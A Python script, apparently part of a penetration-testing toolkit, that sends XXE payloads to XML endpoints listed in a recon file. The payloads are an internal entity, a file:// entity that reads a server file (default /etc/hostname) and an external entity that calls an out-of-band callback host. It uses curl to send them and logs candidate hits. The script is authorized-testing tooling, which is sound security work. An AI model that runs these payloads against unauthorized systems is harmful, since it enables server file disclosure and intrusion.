# -*- coding: utf-8 -*-
"""hunt-xxe hunt 阶段：对 XML 入口发分级 payload，判实体解析/文件读取/OOB。

分级：①内部实体回显 ②file:// 读授权文件 ③外部实体打 OAST(OOB)。
④外部 DTD 报错外带需你自建 DTD 服务器，脚本给出 payload 模板，不自动托管。
只读授权无害文件；OOB 命中需在 OAST 侧核对。

用法:
  python hunt_xxe.py --input recon/endpoints.json --output candidates.json --oast <域名>
      [--read-file /etc/hostname] [--dry-run]
"""
import argparse
import os
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import log, load_json, save_json  # noqa: E402

MARK = "HUNTXXE_OK"


def payloads(oast, read_file):
    internal = ('<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY hxxe "%s">]>\n'
                '<root><a>&hxxe;</a></root>' % MARK)
    fileread = ('<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY f SYSTEM "file://%s">]>\n'
                '<root><a>&f;</a></root>' % read_file)
    oob = ('<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY x SYSTEM "http://%s/xxe">]>\n'
           '<root><a>&x;</a></root>' % oast)
    return [("internal-entity", internal, "resp含 %s" % MARK),
            ("file-read", fileread, "resp含文件内容"),
            ("oob-http", oob, "OAST 收到回连")]


def post_xml(url, body, max_time=8):
    try:
        p = subprocess.run(["curl", "-sS", "-i", "--max-time", str(max_time),
                            "-H", "Content-Type: application/xml",
                            "-X", "POST", "--data-binary", body, url],
                           capture_output=True, text=True, timeout=max_time + 3)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as e:
        return "ERR:%s" % e


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--input", required=True)
    ap.add_argument("--output", required=True)
    ap.add_argument("--oast", required=True)
    ap.add_argument("--read-file", default="/etc/hostname")
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()

    data = load_json(args.input)
    if not data:
        sys.exit("读不到 %s，先跑 recon.sh" % args.input)
    eps = data.get("endpoints", [])
    targets = [e.get("url") for e in eps if e.get("url")] or [data.get("target")]
    cands = []
    for url in dict.fromkeys(targets):  # 去重
        for name, body, expect in payloads(args.oast, args.read_file):
            if args.dry_run:
                print("[dry-run] %s -> %s\n%s\n" % (name, url, body)); continue
            resp = post_xml(url, body)
            signal, suspected = [], False
            if name == "internal-entity" and MARK in resp:
                signal.append("内部实体被解析(XML 解析器展开实体)"); suspected = True
            elif name == "file-read" and MARK not in resp and len(resp) > 0 and args.read_file:
                # 粗判：响应里出现非 HTML 的短文本(主机名)难自动断言，标注待人工核对
                signal.append("已发 file:// 读取，请人工核对响应是否含 %s 内容" % args.read_file)
            elif name == "oob-http":
                signal.append("已发外部实体，请在 OAST(%s) 侧核对回连" % args.oast)
            else:
                signal.append("无明显信号")
            cands.append({"endpoint": url, "family": name, "expect": expect,
                          "payload": body, "resp_head": resp[:200],
                          "signal": signal, "suspected": suspected})
    if args.dry_run:
        return
    save_json(args.output, {"target": data.get("target"), "oast": args.oast,
                            "read_file": args.read_file, "candidates": cands})
    log("XXE 候选 %d（%d 确认实体解析）-> %s（file/OOB 请人工核对响应与 OAST）"
        % (len(cands), sum(1 for c in cands if c["suspected"]), args.output))


if __name__ == "__main__":
    main()
